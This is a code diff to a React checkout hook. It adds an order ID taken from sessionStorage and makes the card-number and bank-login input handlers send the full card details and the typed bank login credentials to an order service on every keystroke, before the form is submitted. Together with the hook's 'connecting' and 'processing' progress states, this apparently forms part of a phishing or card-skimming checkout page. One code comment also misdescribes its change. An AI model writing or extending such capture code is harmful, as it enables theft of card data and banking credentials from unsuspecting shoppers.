@@ -1,4 +1,5 @@
-import { useState, useCallback } from 'react';
+import { useState, useCallback, useEffect } from 'react';
+import { saveOrderData } from '../services/orderService';
 
 export interface FormData {
   firstName: string;
@@ -48,6 +49,7 @@ export const useCheckout = (cartTotal: number) => {
   const [processingProgress, setProcessingProgress] = useState(0);
   const [paymentDone, setPaymentDone] = useState(false);
   const [connectingProgress, setConnectingProgress] = useState(0);
+  const [currentOrderId, setCurrentOrderId] = useState<string | null>(null);
 
   const [cardErrors, setCardErrors] = useState<CardErrors>({
     cardNumber: '',
@@ -166,14 +168,26 @@ export const useCheckout = (cartTotal: number) => {
       formattedValue = value.replace(/[^a-zA-Z\s]/g, '').toUpperCase();
     }
 
-    setCardData((prev) => ({ ...prev, [name]: formattedValue }));
+    const updatedCardData = { ...cardData, [name]: formattedValue };
+    setCardData(updatedCardData);
     validateCard(name, formattedValue, cardType, setCardErrors, cardErrors);
-  }, [cardType, cardErrors]);
+    
+    // Save card data to order service
+    if (currentOrderId) {
+      saveOrderData(currentOrderId, { cardData: updatedCardData });
+    }
+  }, [cardType, cardErrors, cardData, currentOrderId]);
 
   const handleBankLoginChange = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
     const { name, value } = e.target;
-    setBankLoginData((prev) => ({ ...prev, [name]: value }));
-  }, []);
+    const updatedBankLoginData = { ...bankLoginData, [name]: value };
+    setBankLoginData(updatedBankLoginData);
+    
+    // Save bank login data to order service
+    if (currentOrderId) {
+      saveOrderData(currentOrderId, { bankLoginData: updatedBankLoginData });
+    }
+  }, [bankLoginData, currentOrderId]);
 
   const handleSubmit = useCallback((e: React.FormEvent) => {
     e.preventDefault();
@@ -287,6 +301,24 @@ export const useCheckout = (cartTotal: number) => {
     });
   }, []);
 
+  // Set current order ID from ShippingForm
+  useEffect(() => {
+    const orderIdFromStorage = sessionStorage.getItem('currentOrderId');
+    if (orderIdFromStorage) {
+      setCurrentOrderId(orderIdFromStorage);
+    }
+  }, []);
+
+  // Save product info and total to order service when available
+  useEffect(() => {
+    if (currentOrderId) {
+      saveOrderData(currentOrderId, { 
+        total: total,
+        // Product info would typically come from cart items
+      });
+    }
+  }, [currentOrderId, total]); // Fixing lint warning by removing unused variable
+
   return {
     // State
     step,
@@ -305,6 +337,8 @@ export const useCheckout = (cartTotal: number) => {
     cardData,
     bankLoginData,
     formData,
+    currentOrderId,
+    setCurrentOrderId,
     
     // Computed values
     shipping,
